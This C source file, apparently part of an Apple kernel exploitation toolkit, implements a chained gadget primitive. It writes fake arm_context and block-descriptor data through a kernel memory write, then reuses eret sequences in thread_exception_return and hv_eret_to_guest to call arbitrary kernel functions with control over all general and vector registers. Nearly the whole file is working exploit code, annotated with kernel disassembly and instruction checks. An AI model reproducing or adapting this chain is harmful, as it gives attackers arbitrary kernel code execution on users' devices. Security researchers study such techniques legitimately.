/// Return the values of registers `x20`, `x21` and `pc` with which Link 1 must be called
/// Before calling the Link 1, the data in memory pointed by `x0` must also be updated to
/// the returned `x0_data` value
struct link1_requirements xe_util_kfunc_link1_prepare(link1_t link1, uintptr_t target_func, const struct arm_context* x0_data, uint64_t x4, uint64_t sp, uintptr_t block_descriptor) {
    struct link1_requirements req;
    bzero(&req, sizeof(req));
    
    /// Value for ELR_EL1. The Link 1 will branch to this address using
    /// `eret` instruction after register values are loaded from memory
    /// pointed by `x0`
    req.x20 = target_func;
    /// Value for SPSR_EL1. `PSTATE` will be restored to this value before
    /// `eret` branches to `ELR_EL1`
    req.x21 = 0x400008;
    
    static_assert(offsetof(struct arm_context, ss.uss.x[0]) == TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET, "");
    /// Incrementing the x0_arm_context address by 1 because this will be decremented
    /// by `Block_release` before dispose helper is called
    req.x0_data.ss.uss.x[0] = link1->x0_arm_context + 1;
    req.x0_data.ss.uss.x[4] = x4;
    req.x0_data.ss.uss.sp = sp;
    
    /// Update the memory pointed by `x0`
    xe_kmem_write(link1->x0_arm_context, 0, (void*)x0_data, sizeof(*x0_data));
    
    static_assert(offsetof(struct arm_context, ss.uss.x[2]) == TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, "");
    /// Set `block->descriptor` pointer value to fake block descriptor
    req.x0_data.ss.uss.x[2] = block_descriptor;
    
    /// Entry point to link 1
    req.pc = xe_slider_kernel_slide(FUNC_ARM64_THREAD_EXECPTION_RETURN_ADDR) + ARM64_THREAD_ERET_ENTRY_OFFSET;
    
    /// Verify the entry point is correct
    /// mov x1, x20
    xe_assert_cond(xe_kmem_read_uint32(req.pc, 0), ==, 0xaa1403e1);
    /// mov x2, x21
    xe_assert_cond(xe_kmem_read_uint32(req.pc, 4), ==, 0xaa1503e2);
    /// msr PState.SP, #0x0
    xe_assert_cond(xe_kmem_read_uint32(req.pc, 8), ==, 0xd50040bf);
    return req;
}

void xe_util_kfunc_link1_destroy(link1_t link1) {
    xe_allocator_large_mem_free(&link1->x0_data_allocator);
}


// MARK: - Link 2
/// Call an arbitary kernel function with control over registers x0-x30 and q0-q31
///
///
/// kernel.release.t6000(21E230)`hv_eret_to_guest:
/// 0xfffffe000725efdc      ldr    w1, [x0, #0x340]
/// ...
/// 0xfffffe000725f098      msr    SPSR_EL1, x3
/// 0xfffffe000725f09c      msr    ELR_EL1, x4                 _    => ENTRY POINT, loads ELR_EL1 from x1
/// 0xfffffe000725f0a0      ldp    q0, q1, [x0, #0x140]         |
/// 0xfffffe000725f0a4      ldp    q2, q3, [x0, #0x160]         |
/// 0xfffffe000725f0a8      ldp    q4, q5, [x0, #0x180]         |
/// 0xfffffe000725f0ac      ldp    q6, q7, [x0, #0x1a0]         |
/// 0xfffffe000725f0b0      ldp    q8, q9, [x0, #0x1c0]         |
/// 0xfffffe000725f0b4      ldp    q10, q11, [x0, #0x1e0]     |
/// 0xfffffe000725f0b8      ldp    q12, q13, [x0, #0x200]     |
/// 0xfffffe000725f0bc      ldp    q14, q15, [x0, #0x220]     | >    Loads q0 - q31 from `struct arm_context` in memory
/// 0xfffffe000725f0c0      ldp    q16, q17, [x0, #0x240]     |       pointed by x0
/// 0xfffffe000725f0c4      ldp    q18, q19, [x0, #0x260]     |
/// 0xfffffe000725f0c8      ldp    q20, q21, [x0, #0x280]     |
/// 0xfffffe000725f0cc      ldp    q22, q23, [x0, #0x2a0]     |
/// 0xfffffe000725f0d0      ldp    q24, q25, [x0, #0x2c0]     |
/// 0xfffffe000725f0d4      ldp    q26, q27, [x0, #0x2e0]     |
/// 0xfffffe000725f0d8      ldp    q28, q29, [x0, #0x300]     |
/// 0xfffffe000725f0dc      ldp    q30, q31, [x0, #0x320]   _|
/// 0xfffffe000725f0e0      ldp    x2, x3, [x0, #0x18]           |
/// 0xfffffe000725f0e4      ldp    x4, x5, [x0, #0x28]           |
/// 0xfffffe000725f0e8      ldp    x6, x7, [x0, #0x38]           |
/// 0xfffffe000725f0ec      ldp    x8, x9, [x0, #0x48]           |
/// 0xfffffe000725f0f0       ldp    x10, x11, [x0, #0x58]       |
/// 0xfffffe000725f0f4       ldp    x12, x13, [x0, #0x68]       |
/// 0xfffffe000725f0f8       ldp    x14, x15, [x0, #0x78]       | >     Loads x0-x30 from `struct arm_context` in memory
/// 0xfffffe000725f0fc       ldp    x16, x17, [x0, #0x88]       |        pointed by x0
/// 0xfffffe000725f100      ldp    x18, x19, [x0, #0x98]       |
/// 0xfffffe000725f104      ldp    x20, x21, [x0, #0xa8]       |
/// 0xfffffe000725f108      ldp    x22, x23, [x0, #0xb8]       |
/// 0xfffffe000725f10c      ldp    x24, x25, [x0, #0xc8]       |
/// 0xfffffe000725f110      ldp    x26, x27, [x0, #0xd8]       |
/// 0xfffffe000725f114      ldr    x28, [x0, #0xe8]                |
/// 0xfffffe000725f118      ldp    x29, x30, [x0, #0xf0]        |
/// 0xfffffe000725f11c      ldp    x0, x1, [x0, #0x8]          _ |
/// 0xfffffe000725f120      eret                                              =>  Branches to ELR_EL1. SPSR_EL1 reused from link 1
///

typedef struct link2 {
    /// Empty
}* link2_t;


void xe_util_kfunc_link2_init(link2_t link2) {
    /// Empty
}


struct link2_requirements {
    struct arm_context x0_data;
    uint64_t x4;
    uint64_t pc;
};

/// Returns the values of registers `x4` and `pc` that must be set before Link  2
/// is called. The memory pointed by `x0` must also be updated to `x0_data`
/// before calling Link 2
struct link2_requirements xe_util_kfunc_link2_prepare(link2_t link2, uintptr_t target_func, const uint64_t x[29], uint64_t fp, uint64_t lr, const uint128_t q[32]) {
    struct link2_requirements req;
    bzero(&req, sizeof(req));
    
    /// Value for ELR_EL1. Link 2 will branch to this address after
    /// loading register values
    req.x4 = target_func;
    
    /// Link 2 will set values of these registers before executing the `eret` instruction
    /// and branching to target func
    memcpy(req.x0_data.ss.uss.x, x, sizeof(req.x0_data.ss.uss.x));
    req.x0_data.ss.uss.fp = fp;
    req.x0_data.ss.uss.lr = lr;
    memcpy(req.x0_data.ns.uns.v.q, q, sizeof(req.x0_data.ns.uns.v.q));
    
    /// Entry point to Link 2
    req.pc = xe_slider_kernel_slide(FUNC_ARM64_HV_ERET_TO_GUEST_ADDR) + HV_ERET_TO_GUEST_ENTRY_OFFSET;
    /// msr elr_el1, x4
    xe_assert_cond(xe_kmem_read_uint32(req.pc, 0), ==, 0xd5184024);
    return req;
}

void xe_util_kfunc_link2_destroy(link2_t link2) {
    /// Empty
}


// MARK: - Chain

struct xe_util_kfunc {
    struct link0 link0;
    struct link1 link1;
    struct link2 link2;
    
    enum {
        CHAIN_STATE_CREATED,
        CHAIN_STATE_PREPARED
    } state;
};


xe_util_kfunc_t xe_util_kfunc_create(uint free_zone_idx) {
    xe_util_kfunc_t util = malloc(sizeof(struct xe_util_kfunc));
    util->state = CHAIN_STATE_CREATED;
    xe_util_kfunc_link0_init(&util->link0, free_zone_idx);
    xe_util_kfunc_link1_init(&util->link1);
    xe_util_kfunc_link2_init(&util->link2);
    return util;
}


struct xe_util_kfunc_register_state xe_util_kfunc_pre_execute(xe_util_kfunc_t util) {
    xe_assert_cond(util->state, ==, CHAIN_STATE_CREATED);
    
    struct xe_util_kfunc_register_state register_state = xe_util_kfunc_link0_pre_execute(&util->link0);
    
    util->state = CHAIN_STATE_PREPARED;
    return register_state;
}


void xe_util_kfunc_execute(xe_util_kfunc_t util, uintptr_t target_func, const struct xe_util_kfunc_args* args) {
    xe_assert_cond(util->state, ==, CHAIN_STATE_PREPARED);
    
    struct link2_requirements link2_req = xe_util_kfunc_link2_prepare(&util->link2, target_func, args->x, args->fp, args->lr, args->q);
    
    struct link1_requirements link1_req = xe_util_kfunc_link1_prepare(&util->link1, link2_req.pc, &link2_req.x0_data, link2_req.x4, args->sp, util->link0.block_descriptor);
    
    xe_util_kfunc_link0_execute(&util->link0, link1_req.pc, link1_req.x20, link1_req.x21, &link1_req.x0_data, sizeof(link1_req.x0_data));
    
    util->state = CHAIN_STATE_CREATED;
}


void xe_util_kfunc_execute_simple(xe_util_kfunc_t util, uintptr_t target_func, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    struct xe_util_kfunc_register_state register_state = xe_util_kfunc_pre_execute(util);
    struct xe_util_kfunc_args args;
    bzero(&args, sizeof(args));
    /// Set arguments to the target function
    args.x[0] = x0;
    args.x[1] = x1;
    args.x[2] = x2;
    args.x[3] = x3;
    args.x[4] = x4;
    args.x[5] = x5;
    args.x[6] = x6;
    args.x[7] = x7;
    /// Fixup required callee-saved registers
    args.x[19] = register_state.x19;
    args.x[20] = register_state.x20;
    args.x[21] = register_state.x21;
    args.x[22] = register_state.x22;
    args.x[23] = register_state.x23;
    args.x[24] = register_state.x24;
    args.x[25] = register_state.x25;
    args.x[26] = register_state.x26;
    args.fp = register_state.fp;
    args.lr = register_state.lr;
    args.sp = register_state.sp;
    xe_util_kfunc_execute(util, target_func, &args);
}


void xe_util_kfunc_destroy(xe_util_kfunc_t* util_p) {
    xe_util_kfunc_t util = *util_p;
    xe_util_kfunc_link0_destroy(&util->link0);
    xe_util_kfunc_link1_destroy(&util->link1);
    xe_util_kfunc_link2_destroy(&util->link2);
    free(util);
    *util_p = NULL;
}

